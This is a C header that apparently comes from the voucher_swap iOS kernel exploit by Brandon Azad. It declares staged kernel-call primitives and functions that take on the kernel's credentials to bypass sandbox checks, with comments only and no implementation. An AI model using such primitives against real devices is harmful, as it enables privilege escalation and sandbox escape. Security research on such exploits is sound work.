/*
 * kernel_call/user_client.h
 * Brandon Azad
 */
#ifndef VOUCHER_SWAP__KERNEL_CALL__USER_CLIENT_H_
#define VOUCHER_SWAP__KERNEL_CALL__USER_CLIENT_H_

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/*
 * stage1_kernel_call_init
 *
 * Description:
 * 	Initialize stage 1 of kernel function calling.
 *
 * Initializes:
 * 	kernel_call_parameters_init()
 * 	stage1_kernel_call_7v()
 */
bool stage1_kernel_call_init(void);

/*
 * stage1_kernel_call_deinit
 *
 * Description:
 * 	Deinitialize stage 1 of kernel function calling.
 */
void stage1_kernel_call_deinit(void);

/*
 * stage1_get_kernel_buffer
 *
 * Description:
 * 	Get the address of a 0x1000-byte scratch space in kernel memory that can be used by other
 * 	stages.
 */
uint64_t stage1_get_kernel_buffer(void);

/*
 * stage1_kernel_call_7v
 *
 * Description:
 * 	Call a kernel function using our stage 1 execute primitive.
 *
 * Restrictions:
 * 	At most 7 arguments can be passed.
 * 	The return value is truncated to 32 bits.
 * 	At stage 1, only arguments X1 - X6 are controlled.
 * 	The function pointer must already have a PAC signature.
 */
uint32_t stage1_kernel_call_7v(uint64_t function,
		size_t argument_count, const uint64_t arguments[]);

/*
 * stage3_kernel_call_init
 *
 * Description:
 * 	Initialize stage 3 of kernel function calling.
 *
 * Initializes:
 * 	kernel_call_7v()
 */
bool stage3_kernel_call_init(void);

/*
 * stage3_kernel_call_deinit
 *
 * Description:
 * 	Deinitialize stage 3 of kernel function calling.
 */
void stage3_kernel_call_deinit(void);

/*
 * assume_kernel_credentials
 *
 * Description:
 *   Set this process's credentials to the kernel's credentials so that we can bypass sandbox
 *   checks.
 */
void assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred);
/*
 * restore_credentials
 *
 * Description:
 *   Restore this process's credentials after calling assume_kernel_credentials().
 */
void restore_credentials(uint64_t ucred_field, uint64_t ucred);

#endif
